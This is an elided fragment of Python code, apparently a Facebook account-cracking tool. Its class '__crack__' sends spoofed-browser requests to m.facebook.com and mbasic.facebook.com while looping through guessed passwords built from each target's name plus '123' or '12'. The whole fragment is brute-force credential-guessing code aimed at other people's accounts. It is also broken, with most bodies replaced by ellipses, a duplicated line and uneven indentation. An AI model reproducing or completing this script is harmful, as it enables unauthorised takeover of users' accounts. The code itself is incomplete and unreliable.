...
class __crack__:
    ...
    def __api__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"ar-AR;q=0.9,en-US;q=0.8,en;q=0.7"})
    ...
    def __mbasic__(self, user, __yan__):
        ...
        for pw in __yan__:
            ...
            ses = requests.Session()
            ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"ar-AR;q=0.9,en-US;q=0.8,en;q=0.7"})
            	...
            	for yntkts in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        ...
                        if len(xz) == 3 or len(xz) == 4 or len(xz) == 5 or len(xz) == 6:
                            pwx = [name, xz[0]+"123", xz[0]+"12"]
                            pwx = [name, xz[0]+"123", xz[0]+"123"]
